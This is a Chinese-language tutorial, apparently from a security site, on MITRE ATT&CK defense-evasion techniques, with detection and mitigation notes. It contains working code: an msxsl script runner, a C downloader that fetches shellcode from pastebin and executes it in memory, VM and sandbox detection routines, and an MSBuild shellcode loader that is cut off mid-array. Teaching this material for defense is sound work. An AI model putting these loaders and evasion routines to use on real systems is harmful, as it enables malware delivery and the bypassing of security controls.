##  一、前言

 **基于MITRE ATT &CK框架中关于“防御逃逸”（Defense
Evasion）的战术专题，笔者将深入介绍其中大部分防御逃逸手段的技术原理、检测方法及缓解方案，为求简洁直观的表达其技术原理，本文对部分战术的实现提供了演示性的代码。**

其实在学习MITRE
ATT&CK框架并一个个实现其原理的过程中，就会发现我们慢慢的对攻击者的攻击思路和攻击方向有了更清晰的认识，并逐步了解他们是如何发现新的攻击手段的。例如在本次的防御逃逸专题中有个应用程序白名单绕过，攻击者总会在Windows系统上找到一些被系统或杀软信任而不会进行限制的应用程序，这些应用通常是被大家忽视或不常用的。当它们有一些可被利用的漏洞时，就会造成严重后果。但当我们了解了攻击者的思路，或许就可以先他一步找到漏洞，避免损失。

当然，在网络上充斥着大量的恶意代码，也不断的有新的变种出现，鉴定和分析恶意代码也成为了 **安全事件响应** 及信息安全工程师的必备技能。希望本文能够为从事
**信息安全** 相关工作的攻城狮带来启发，通过了解这些常规防御逃逸手段而帮助他们在应对 **入侵响应** 、 **样本分析**
等方面工作能够更加游刃有余。

本文所介绍的防御逃逸战术情况如下：

战术  |  MITRE ATT&CK链接  
---|---  
XSL脚本代码代理执行  |  <https://attack.mitre.org/techniques/T1220/>  
利用可信网络服务进行数据隐蔽传输  |  <https://attack.mitre.org/techniques/T1102/>  
虚拟化和沙箱的检测  |  <https://attack.mitre.org/techniques/T1497>  
受信任的开发人员实用程序利用  |  <https://attack.mitre.org/techniques/T1127/>  
时间戳伪装  |  <https://attack.mitre.org/techniques/T1099/>  
PubPrn代理脚本代码执行  |  <https://attack.mitre.org/techniques/T1216/>  
签名二进制程序代理执行  |  <https://attack.mitre.org/techniques/T1218/>  
Regsvr32代理代码执行  |  <https://attack.mitre.org/techniques/T1117/>  
进程注入  |  <https://attack.mitre.org/techniques/T1055/>  
利用NTFS ADS进行数据隐藏  |  <https://attack.mitre.org/techniques/T1096/>  
Mshta代理执行脚本代码  |  <https://attack.mitre.org/techniques/T1170/>  
CHM文件隐藏代码执行  |  <https://attack.mitre.org/techniques/T1223/>  
CMSTP配置文件参数利用  |  <https://attack.mitre.org/techniques/T1191/>  
本机程序编译代码执行  |  <https://attack.mitre.org/techniques/T1500/>  
额外窗口内存注入  |  <https://attack.mitre.org/techniques/T1181/>  
间接命令执行  |  <https://attack.mitre.org/techniques/T1202/>  
解码文件并执行  |  <https://attack.mitre.org/techniques/T1140/>  
控制面板文件代码执行  |  <https://attack.mitre.org/techniques/T1196/>  
入侵痕迹清除  |  <https://attack.mitre.org/techniques/T1070/>  
文件加壳  |  <https://attack.mitre.org/techniques/T1045/>  
修改文件权限  |  <https://attack.mitre.org/techniques/T1222/>  
  
以Att&ck中对每个防御逃逸战术手段的描述，笔者将每个例子以及所绕过的防御来进行归类，分类情况如下：

分类  |  战术  |  简介  
---|---|---  
数字证书验证  |
XSL脚本代码代理执行、PubPrn代理脚本代码执行、签名二进制程序代理执行、regsvr32代理脚本代码执行、mshta代理执行脚本代码、CHM文件隐藏代码执行
|
通过验证数字证书，可以快速有效的验证程序和代码的来源，从而可以杜绝部分恶意代码的执行。目前这些所列出的战术，均通过利用已被可信证书签名的程序或脚本提供的功能，实现“动态代理执行”外部的脚本或代码，而不破坏原有程序完整性。从攻击者角度来看，通过逆向分析具有合法签名的程序，挖掘可滥用的点（如调用动态链接库、引用外部参数），则可以利用签名过的程序执行代码从而突破数字证书验证。  
应用程序白名单  |
XSL脚本代码代理执行、受信任的开发人员实用程序利用、PubPrn代理脚本代码执行、签名二进制程序代理执行、regsvr32代理脚本代码执行、进程注入、mshta代理执行脚本代码、CMSTP配置文件参数利用、CHM文件隐藏代码执行、控制面板文件代码执行
|
不论是操作系统还是杀毒软件，为了系统安全，当启动某程序或者某程序执行一些敏感操作的时候，会进行提示，让用户选择是否允许该操作。而所有程序都进行提示势必会影响用户体验，所以在系统和杀软中会存在白名单列表，名单中程序的运行被系统或杀软信任而不会进行限制与提示。依据这样的特性，攻击者通过逆向分析白名单中的程序，挖掘可滥用的点（如调用外部动态链接库、引用外部参数），则可以通过白名单程序间接的执行代码而突破限制，这对于突破系统层面或杀软层面的白名单限制都有帮助。  
反病毒 Anti-Virus  |  XSL脚本代码代理执行、虚拟化和沙箱的检测、regsvr32代理脚本代码执行、进程注入、利用NTFS
ADS进行数据隐藏、CMSTP配置文件参数利用、本机程序编译代码执行、解码文件并执行、额外窗口内存注入、入侵痕迹清除、文件加壳  |
反病毒软件提供的保护是全面而系统的，攻击者针对不同的防护措施通常采用不同的绕过措施。如针对文件扫描查杀，攻击者可能会采用文件分割运行时组合的方式。针对行为查杀，则可能会采用可信程序代理执行关键行为的方式。绕过反病毒软件需要分析具体防护措施的原理，以挖掘绕过和突破的方案。  
绕过防火墙  |  利用可信网络服务进行数据隐蔽传输  |
数据传输是攻击过程中的重要一环，为绕过防火墙拦截而隐蔽传输数据，攻击者可能会在通讯目标及通讯过程两方面进行调整，以突破拦截。通讯过程中的调整主要是通讯协议、通讯频率，将恶意的流量夹杂在正常的通讯协议中，在此基础上，通过将通讯目标改为受信任的地址，可以突破防火墙的拦截。  
静态文件分析  |  虚拟化和沙箱的检测、本机程序编译代码执行、文件加壳  |
静态文件分析绕过战术，有几个方向。如运行之初首先检测是否允许于沙箱和虚拟机而不主动执行恶意代码，可避免被部分自动化分析环境的分析，由于自动化分析环境和正常使用的电脑环境之间一定存在某些差异（如
鼠标运动轨迹、系统已安装的程序等等），利用这些差异来识别运行环境是否为分析环境。还有一个方向是通过技术手段避免代码被轻易得逆向分析，代表性的手段就是加壳加密。由于代码始终需要在客户端进行执行，加壳加密只能是一定程度上加强反分析的能力，但强壳拥有较高的反分析能力，而普通压缩壳反分析能力较弱。  
主机取证分析  |  虚拟化和沙箱的检测、时间戳伪装、利用NTFS ADS进行数据隐藏、入侵痕迹清除  |
为避免被取证分析，攻击者可能会尝试删除入侵痕迹、恶意代码不落地等手段，避免在系统中留下可被分析的记录信息，这与攻击者的行为有关，可被捕捉并分析的记录包含
网络流量、文件操作、日志记录、进程操作及注册表记录等等。  
主机入侵防御系统  |  本机程序编译代码执行、解码文件并执行、额外窗口内存注入、入侵痕迹清除  |
HIPS通过文件、注册表、程序运行三大方面进行监控而实现安全防护。为绕过HIPS的监控，可以通过寻找“代理人”来代理执行代码，如系统中运行的某个可信程序存在代码执行漏洞，普通程序通过触发漏洞执行代码以避免被HIPS拦截提示。  
基于签名的检测  |  本机程序编译代码执行、解码文件并执行、文件加壳  |
所述的基于签名检测即检测文件MD5签名，确认是否为样本库中所包含的恶意文件。众所周知的是，文件内容修改任意一字节其MD5值便会发生变化，由可执行文件的文件结构存在众多可修改的字段，故手工修改文件以绕过MD5检测不是大的问题，重点应在于可执行文件实现运行时自修改，在运行之时自修改磁盘上的可执行程序以保证文件MD5的不断变化，实现绕过基于签名的检测。  
文件系统访问控制  |  修改文件或目录权限  |
当攻击者侵入主机时，为了获取更多信息，攻击者可以修改文件或目录权限，想办法获取更高的权限，以避开DACL对访问控制的管理  
  
##  二、详例

###  1、XSL脚本代码代理执行

**原理及代码介绍**

可扩展样式表语言（XSL）文件通常用于描述XML文件中的数据的处理方式和显示方式，其中为了支持复杂的操作，XSL提供了对各种嵌入式脚本的支持，典型的如Javascript。攻击者可能会通过利用此功能来
**代理执行任意代码** ，以绕过应用程序 **白名单防护** 。

XML是一种可扩展的标记语言，被设计用来传输和存储数据。XML类似于HTML，但是和HTML有着本质的区别， XML
被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观， 即XML旨在传输信息，而HTML旨在显示信息。

而XSL指扩展样式表语言(EXtensible Stylesheet Language),
XSL主要是用于基于XML的样式表语言。XSLT是XSL中最重要的部分，XSLT指XSL Transformations，XSLT 用于将一种 XML
文档转换为另外一种 XML 文档，或者可被浏览器识别的其他类型的文档，比如 HTML 和 XHTML。通常，XSLT 是通过把每个 XML 元素转换为
(X)HTML 元素来完成这项工作的。通过
XSLT，您可以向或者从输出文件添加或移除元素和属性。您也可重新排列元素，执行测试并决定隐藏或显示哪个元素，等等。

微软提供了一个名为MSXSL的命令行工具，用于执行XSL
transformations操作，并可以用来执行嵌入在本地或者远程（通过URL指定）XSL文件中的恶意JavaScript。由于该程序默认不安装在Windows系统上，因此攻击者可能需要将其与恶意文件打包在一起放在目标电脑上。

执行本地脚本及远程脚本的命令行示例如下：

    
    
    msxsl.exe customers.xml script.xsl msxsl.exe http://www.google.com/customers.xml http://www.google.com/script.xsl

Customers.xml文件内容如下：

    
    
    <?xml version="1.0"?> <?xml-stylesheet type="text/xsl" href="test.xsl" ?> <customers> <customer> <name>Microsoft Windows    </name> </customer> </customers>

Script.xsl 文件内容如下：

    
    
    <?xml version='1.0'?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"> <msxsl:script language="JScript" implements-prefix="user">    function xml(nodelist)     {         var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c calc.exe");         return nodelist.nextNode().xml;     } </msxsl:script> <xsl:template match="/">    <xsl:value-of select="user:xml(.)"/> </xsl:template> </xsl:stylesheet>

 **运行效果图**

通过CMD进程使用通过命令行进行带参数的命令执行msxsl.exe，test.xsl中的JavaScript会得以执行，该代码执行的宿主程序是msxsl.exe，最后计算器得以执行.

![1.png](https://image.3001.net/images/20191226/15773301239555.png!small)

**检查及限制方案**

通过进程来监视msxsl.exe的执行及其参数，将该程序最近的调用与历史中已知的良好的调用进行比较，已确定异常和潜在的对抗活动。例如：URL命令行参数、外部网络连接的创建、与脚本关联的动态链接库加载等等事件。

由于msxsl并不是系统默认附带的，所以如果计算机中意外出现该程序，需要进一步查询该文件的作用及来历。

**参考链接**

> XML 教程：<https://www.w3school.com.cn/xml/index.asp>
>
> XSLT教程: <https://www.w3school.com.cn/xsl/index.asp>
>
> ATT&CK：<https://attack.mitre.org/techniques/T1220/>

###  2、利用可信网络服务进行数据隐蔽传输

**原理及代码介绍**

部分攻击者会使用现有的合法外部Web服务作为中转服务器，将命令和数据中继到受感染的系统中。也有攻击者在在外部的Web服务中放置C&C服务器的信息，通过将C&C信息放在可编辑的Web服务中，受感染系统首先会与该服务进行通讯，然后解析其中数据开始连接真实的C&C服务器。

流行的网站和可信的网站可能会为 **数据隐蔽传输**
做一下掩盖，因为内网的主机在被入侵之前就有与这些网站进行通信的可能性。使用常见的服务（如Google或Twitter提供的服务）可以使数据交互更容易
**隐藏** 。另外Web服务提供商通常使用SSL/TLS加密，这些也为攻击者提供了额外的保护。

使用Web服务存放C&C服务器信息，可以避免因将该信息硬编码到样本中而被分析发现的可能，同时还可以实现C&C服务器的 **弹性**
操作（可以动态修改Web服务中的C&C服务器信息）。

以下总结Att&CK中列举的知名APT组织或工具使用的相关技术手段，粗略分类可分为三大类：

技术手段  |  APT组织、工具名称  |  备注  
---|---|---  
在Web服务中保存C&C信息，实现弹性C&C连接  |
APT12、APT37、APT41、BlackCoffee、HAMMERTOSS、Kazuar、Leviathan、LOWBALL、Magic
Hound、MiniDuke、OnionDuke、Orz、POORAIM、PowerStallion、Revenge RAT、RTM、Xbash  |
AOL、Twitter、Dropbox、Box 、Github、PasteBin、Microsoft
TechNet、tumbler、BlogSpot、Google Apps、Yandex、SOAP web、RSS  
通过web服务进行数据中转（如文件传输、控制命令下发、下载Payload动态等等）  |
Carbanak、CloudDuke、RogueRobin、ROKRAT、SLOWDRIFT、Turla、Twitoor、UBoatRAT、BRONZE
BUTLER  |  Microsoft OneDrive、Yandex、Mediafire、Twitter  
伪装或利用其他协议流量进行隐蔽通信  |  Comnie、GLOOXMAIL  |  HTTP、DNS、Jabber / XMPP协议  
  
这里以 **下载Payload并执行**
为例，模拟演示使用Web服务存储可执行代码，利用客户端程序下载并执行的过程。下图为Payload代码，Payload运行后仅弹出提示框证明代码执行成功，首先将代码取出并Base64编码，以便以文本方式进行网络提交和保存：

![2019-12-09_091944.png](https://image.3001.net/images/20191226/15773301781608.png!small)

Base64编码后的内容如下

![22222.png](https://image.3001.net/images/20191226/15773301887486.png!small)

将编码后的内容上载到pastebin.com，生成一个可访问的链接

![2019-12-09_091511.png](https://image.3001.net/images/20191226/15773301997890.png!small)

生成后的地址如下：<https://pastebin.com/raw/LXrbf7PW>，当请求该页面，返回的内容为我们编码后的代码。

![2019-12-09_153835.png](https://image.3001.net/images/20191226/15773302153580.png!small)

通过编写如下代码，完成下载并执行代码的过程。代码较长，这里简述一下执行流程：

> 1、 模拟发送HTTPS请求获取指定页面的内容
>
> 2、 BASE64解码所下载的二进制数据
>
> 3、 将二进制字符串转为二进制数值，并申请一段可执行的内存地址存放该代码
>
> 4、 创建新的线程，将代码执行起来
    
    
    bool read_webpage() {     bool ret = false;     int decode_len = 0;     BYTE pAllData[4096] = {0};     BYTE pDecodeData[4096] = {0};     BYTE* pMessageBody = NULL;     BYTE* pCode = NULL;      HANDLE hNewThread = NULL;     LPCTSTR lpszServerName = L"www.pastebin.com";                        //欲访问的服务器     LPCTSTR lpszObjectName = L"/raw/LXrbf7PW";                            //欲访问的页面     INTERNET_PORT nServerPort = INTERNET_DEFAULT_HTTPS_PORT;            // HTTPS端口443     LPCTSTR lpszAgent = L"WinInetGet/0.1";     HINTERNET hInternet = InternetOpen( lpszAgent,INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);     LPCTSTR lpszUserName = NULL;      LPCTSTR lpszPassword = NULL;      DWORD dwConnectFlags = 0;     DWORD dwConnectContext = 0;     HINTERNET hConnect = InternetConnect(hInternet,lpszServerName, nServerPort,lpszUserName, lpszPassword,INTERNET_SERVICE_HTTP,dwConnectFlags, dwConnectContext);     LPCTSTR lpszVerb = L"GET";     LPCTSTR lpszVersion = NULL;        LPCTSTR lpszReferrer = NULL;        LPCTSTR *lplpszAcceptTypes = NULL;      DWORD dwOpenRequestFlags =  INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP |         INTERNET_FLAG_KEEP_CONNECTION |         INTERNET_FLAG_NO_AUTH |         INTERNET_FLAG_NO_COOKIES |         INTERNET_FLAG_NO_UI |          INTERNET_FLAG_SECURE |         INTERNET_FLAG_RELOAD;     DWORD dwOpenRequestContext = 0;     HINTERNET hRequest = HttpOpenRequest( hConnect, lpszVerb, lpszObjectName, lpszVersion,         lpszReferrer, lplpszAcceptTypes,dwOpenRequestFlags, dwOpenRequestContext);     BOOL bResult = HttpSendRequest(hRequest, NULL, 0, NULL, 0);     if (!bResult)      {         fprintf(stderr, "HttpSendRequest failed, error = %d (0x%x)\n",GetLastError(), GetLastError());         goto SAFE_EXIT;     }     DWORD dwInfoLevel = HTTP_QUERY_RAW_HEADERS_CRLF;     DWORD dwInfoBufferLength = 2048;     BYTE *pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength+2);     while (!HttpQueryInfo(hRequest, dwInfoLevel, pInfoBuffer, &dwInfoBufferLength, NULL))     {         DWORD dwError = GetLastError();         if (dwError == ERROR_INSUFFICIENT_BUFFER)         {             free(pInfoBuffer);             pInfoBuffer = (BYTE *)malloc(dwInfoBufferLength + 2);         }         else         {             fprintf(stderr, "HttpQueryInfo failed, error = %d (0x%x)\n",                 GetLastError(), GetLastError());             break;         }     }     pInfoBuffer[dwInfoBufferLength] = '\0';     pInfoBuffer[dwInfoBufferLength + 1] = '\0';     //printf("%S", pInfoBuffer);      free(pInfoBuffer);     DWORD dwBytesAvailable;     //读取raw数据     while (InternetQueryDataAvailable(hRequest, &dwBytesAvailable, 0, 0))     {         pMessageBody = (BYTE *)malloc(dwBytesAvailable+1);         DWORD dwBytesRead;         BOOL bResult = InternetReadFile(hRequest, pMessageBody,             dwBytesAvailable, &dwBytesRead);         if (!bResult)         {             fprintf(stderr, "InternetReadFile failed, error = %d (0x%x)\n",                 GetLastError(), GetLastError());             goto SAFE_EXIT;         }         if (dwBytesRead == 0)         {             break;          }         pMessageBody[dwBytesRead] = '\0';         strcat((char*)pAllData, (char*)pMessageBody);         free(pMessageBody);     }     printf((char*)pAllData);     //base64 解码, 跳过开头的forTEST{}     if(base64_decode((char*)pAllData + 8, strlen((char*)pAllData) - 9, (char*)pDecodeData, 4096))     {         goto SAFE_EXIT;     }     decode_len = strlen((char*)pDecodeData);     //进一步将字符串转为16进制值     pCode = (BYTE*)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);     if (pCode == NULL)     {         goto SAFE_EXIT;     }     for (int i = 0; i < (decode_len/2); i++)     {         char t[3] = {0};         t[0] = pDecodeData[i * 2 + 0];         t[1] = pDecodeData[i * 2 + 1];         pCode[i] = (unsigned char)strtoul(t, NULL, 16);     }     //创建线程执行下载的代码     hNewThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pCode, NULL, NULL, NULL);     WaitForSingleObject(hNewThread, INFINITE);     ret = true; SAFE_EXIT:     if (pMessageBody != NULL)     {         free(pMessageBody);         pMessageBody = NULL;     }     if (pCode != NULL)     {         VirtualFree(pCode, 0,MEM_RELEASE);     }     return ret; } int _tmain(int argc, _TCHAR* argv[]) {     read_webpage();     return 0; }

最后执行情况如下：

![2019-12-09_154123.png](https://image.3001.net/images/20191226/15773303245341.png!small)

**检查和缓解方案**

**检测方法：**

>
> 1、分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据），用户行为监视可能有助于检测异常活动模式。另外通讯频率也是至关重要的考量单位，单位时间内高频率的Web访问需要重点关注其具体行为。
>
> 2、分析数据包内容以检测未遵循所使用端口的预期协议行为的通信。

**缓解方案：**

> 1、使用网络签名识别特定攻击者恶意程序的流量，通过网络入侵检测和网络访问限制防御系统缓解网络级别的恶意活动。
>
> 2、使用Web代理实施外部网络通讯策略，以防止使用未经授权的外部网络访问服务。

**参考链接**

> 1、Att&ck：<https://attack.mitre.org/techniques/T1102/>

###  3、虚拟化和沙箱的检测

**原理及代码介绍**

恶意软件分析人员经常会使用隔离的环境（如 虚拟机、沙箱）来分析未知程序中的 **恶意代码**
，为了逃避分析并绕过安全系统检测，恶意软件作者通常会添加代码来检测目前是否运行在隔离的环境。一旦检测到这种环境，恶意软件就可以阻止恶意代码运行，或者可以改变恶意软件的行为，从而避免在VM中运行时暴露恶意活动。

例如：在真实硬件上运行时，恶意软件将连接到其C&C服务器，但是在检测到VM时，它将连接到合法域名，从而使分析人员或自动安全检测系统认为这是合法代码。

攻击者可以通过搜索安全监测工具（例如Sysinternals，Wireshark等）来确定目前是否为分析环境。通过搜索流行的虚拟化方案的 **固有特征**
以监测是否运行在虚拟化环境中， 如搜索VMTools进程是否存在以确认是否在VMWare中运行。在恶意代码中使用计时器或循环，来监测代码是否在沙箱中运行。

虚拟机软件主要是模仿真实硬件的硬件功能，但是通常会在操作系统中存在一些特征，这有助于表明它确实是虚拟机而不是物理机。这些特征可能是特定的文件、进程、注册表项、服务或者是网络设备适配器等等。利用这一“设计缺陷”，编码以检测虚拟机配置文件、可执行文件、注册表项或其他特征，从而操纵其原始执行流程。此行为称为“反沙箱”或“反VM”。Att&ck中列举了多种策略，恶意软件使用这些策略来检查流行的沙箱和虚拟环境，下面笔者将以一些常规策略为例，介绍其检测手法及代码实现的原理。

通过WMI 检查主板信息及BIOS信息，以确认是否在虚拟机中运行

在虚拟机中安装的操作系统， 由于其部分硬件为虚构出来的，
有不少硬件存在固定的特征，可以利用该特征来确认是否运行于虚拟机中。如BIOS信息、硬盘信息。众所周知，通过Windows系统中WMI提供的接口可以查询到操作系统中绝大多数的相关信息。如下图所示，通过命令行调用WMIC在使用WMI查询硬盘信息，可以确认，默认的虚拟机中其硬盘名称中包含Vmware
字样，而真实物理机中通常不含这样的信息：

![1.png](https://image.3001.net/images/20191226/15773304169909.png!small)![2.png](https://image.3001.net/images/20191226/15773304358952.png!small)

进一步查询BIOS 的编号，不难发现其编号中也有Vmware字样，而真实物理机中却不包含。

![3.png](https://image.3001.net/images/20191226/15773304565787.png!small)![4.png](https://image.3001.net/images/20191226/15773304665450.png!small)

我们完全可以以这样的差异，用于检测代码是否运行在虚拟系统中，如下的代码演示了通过新建命令行程序并执行查询BIOS编号，通过检查其中是否有Vmware字符串来确定是否允许于Vmware虚拟机中，同理，读者可以尝试一下在其他诸如VirtualBox的虚拟化环境中是否有这样的特征.

    
    
    /*     通过WMI查询， 检查主板信息和BIOS信息，以确认是否在VM中运行 */ bool checkvm_by_wmiinfo() {     bool ret = false;     DWORD cb = 0;     DWORD need_read_cb;     DWORD data_avail;     HANDLE new_process;     STARTUPINFO si;     PROCESS_INFORMATION pi;     HANDLE read_pipe_handle, write_pipe_handle;        SECURITY_ATTRIBUTES sa_attr;      BYTE read_buffer[0x1000];     sa_attr.nLength = sizeof(SECURITY_ATTRIBUTES);      sa_attr.bInheritHandle = TRUE;      sa_attr.lpSecurityDescriptor = NULL;      if(!CreatePipe(&read_pipe_handle, &write_pipe_handle, &sa_attr, 0))     {         goto Error_Exit;     }     memset(&si, 0, sizeof(si));     memset(π, 0, sizeof(pi));     GetStartupInfo(&si);     si.cb = sizeof(si);     si.wShowWindow = SW_HIDE;     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;     si.hStdOutput = write_pipe_handle;     si.hStdError = write_pipe_handle;     if (!CreateProcess(_TEXT("c:\\windows\\system32\\cmd.exe"), _TEXT("\/c wmic bios get serialnumber"), NULL,          NULL, TRUE, NULL, NULL, NULL, &si, π))     {         goto Error_Exit;     }     WaitForSingleObject(pi.hProcess, INFINITE);     do      {         if (!PeekNamedPipe(read_pipe_handle, NULL, NULL, &need_read_cb, &data_avail, NULL) || data_avail <= 0)         {             break;         }         if (!ReadFile(read_pipe_handle, read_buffer,data_avail, &cb, NULL))         {             goto Error_Exit;         }         //读取的 read_buffer 可能为unicode 编码!!!         if(strstr((char*)read_buffer, ("VMware")) != NULL)         {             ret = true;             break;         }     } while (true); Error_Exit:     if(read_pipe_handle != NULL)     {         CloseHandle(read_pipe_handle);         read_pipe_handle = NULL;     }     if(write_pipe_handle != NULL)     {         CloseHandle(write_pipe_handle);         write_pipe_handle = NULL;     }     if(pi.hProcess != NULL)     {         CloseHandle(pi.hProcess);     }     if (pi.hThread != NULL)     {         CloseHandle(pi.hThread);     }     return ret; }

 **搜索系统中的进程名称，通过检查是否正在运行有流行虚拟机的特有进程，来检查是否运行在虚拟机中**

虚拟机为了实现某些功能，通常需要在虚拟的系统中安装一些程序，通过这些程序配合宿主机中安装的程序来完成，如下图所示的vmtoolsd进程，即为VMware实现拖拽功能所须安装的程序，通常情况下，虚拟机都会安装该程序以实现真机和虚拟机的无缝拖拽功能。

![5.png](https://image.3001.net/images/20191226/15773304894980.png!small)

    
    
    /*     搜索系统中的进程名称，通过检查流行虚拟机的特有进程，来检查是否运行在虚拟机中 */ bool checkvm_by_process() {     bool ret = false;     HANDLE process_snap;     PROCESSENTRY32 pe32;     process_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);     if (process_snap == INVALID_HANDLE_VALUE)     {         goto Error_Exit;     }     pe32.dwSize = sizeof(PROCESSENTRY32);     if (!Process32First(process_snap, &pe32))     {         goto Error_Exit;     }     do      {         if ((lstrcmp(pe32.szExeFile, _TEXT("vmtoolsd.exe")) == 0) ||             (lstrcmp(pe32.szExeFile, _TEXT("vmwaretrat.exe")) == 0)||             (lstrcmp(pe32.szExeFile, _TEXT("vmwareuser.exe")) == 0)||             (lstrcmp(pe32.szExeFile, _TEXT("vmacthlp.exe")) == 0)||             (lstrcmp(pe32.szExeFile, _TEXT("vboxservice.exe")) == 0)||             (lstrcmp(pe32.szExeFile, _TEXT("vboxtray.exe")) == 0))         {             ret = true;             break;         }     } while (Process32Next(process_snap, &pe32)); Error_Exit:     if (process_snap != INVALID_HANDLE_VALUE)     {         CloseHandle(process_snap);         process_snap = INVALID_HANDLE_VALUE;     }     return ret; }

**检查及限制方案**

一般而言，虚拟机及沙箱的检测无法通过预防性控制进行环境，因为它基于滥用系统功能

**参考链接**

> ATT&CK：<https://attack.mitre.org/techniques/T1497>

###  4、受信任的开发人员实用程序利用

**原理及代码介绍**

有许多实用程序用于软件开发相关的任务，这些实用程序可以用于执行各种形式的代码，以帮助开发人员进行快速开发、调试和逆向工程。这些实用程序通常拥有合法证书进行签名，以使他们可以在系统上执行，通过这些可信任的进程代理执行恶意代码，可以绕过系统中应用程序防御白名单机制。以下将以MSBuild为例，说明该例。
Microsoft Build Engine 是一个用于生成应用程序的平台。 此引擎（也称为 MSBuild）为项目文件提供了一个 XML
架构，用于控制生成平台处理和生成软件的方式。 Visual Studio 会使用 MSBuild，但它不依赖于 Visual Studio。
通过在项目或解决方案文件中调用 msbuild.exe ，可以在未安装 Visual Studio 的环境中安排和生成产品。

Visual Studio 使用 MSBuild 来加载和生成托管项目。 Visual Studio 中的项目文件（.csproj 、.vbproj
、vcxproj 等）包含 MSBuild XML 代码，当你使用 IDE 来生成项目时，此代码就会运行。 Visual Studio
项目会导入所有必要的设置和生成过程来执行典型的开发工作，但你可以从 Visual Studio 内或通过使用 XML 编辑器对其进行扩展或修改。

攻击者可以使用MSBuild通过受信任的Windows实用工具进行代码代理执行，以绕过系统的Applocker 或者 是杀软的白名单检查机制。 .Net
4中引入的MSBuild内联任务功能允许将C#代码插入XML项目文件中，MSBuild将编译并执行内联任务。MSBuild.exe是一个经过Microsoft签名的二进制文件，因此以这种方式使用它时，可以执行执行任意代码，并绕过配置为允许MSBuild执行的应用程序白名单防护。

![1.png](https://image.3001.net/images/20191226/15773305273727.png!small)

MSBuild可编译特定格式的XML文件，在.NETFramework 4.0中支持了一项新功能”Inline
Tasks”，被包含在元素UsingTask中，可用来在XML文件中执行C#代码，如下的XML文件中包含了加载并执行Shellcode的过程：

    
    
    <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">   <!-- This inline task executes shellcode. -->   <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->   <!-- Save This File And Execute The Above Command -->   <!-- Author: Casey Smith, Twitter: @subTee -->    <!-- License: BSD 3-Clause -->   <Target Name="Hello">     <ClassExample />   </Target>   <UsingTask     TaskName="ClassExample"     TaskFactory="CodeTaskFactory"     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >     <Task>       <Code Type="Class" Language="cs">       <![CDATA[         using System;         using System.Runtime.InteropServices;         using Microsoft.Build.Framework;         using Microsoft.Build.Utilities;         public class ClassExample :  Task, ITask         {                    private static UInt32 MEM_COMMIT = 0x1000;                     private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                     [DllImport("kernel32")]             private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                     [DllImport("kernel32")]             private static extern IntPtr CreateThread(                         UInt32 lpThreadAttributes,             UInt32 dwStackSize,             UInt32 lpStartAddress,             IntPtr param,             UInt32 dwCreationFlags,             ref UInt32 lpThreadId                        );           [DllImport("kernel32")]             private static extern UInt32 WaitForSingleObject(                        IntPtr hHandle,             UInt32 dwMilliseconds             );                     public override bool Execute()           {             byte[] shellcode = new byte[304]{                                     0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,                                      0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,                                      0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,                                      0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,                                      0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,                                      0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,                                      0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,                                      0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,                                      0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,                                      0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,                                      0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,                                      0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,                                      0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,                                      0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 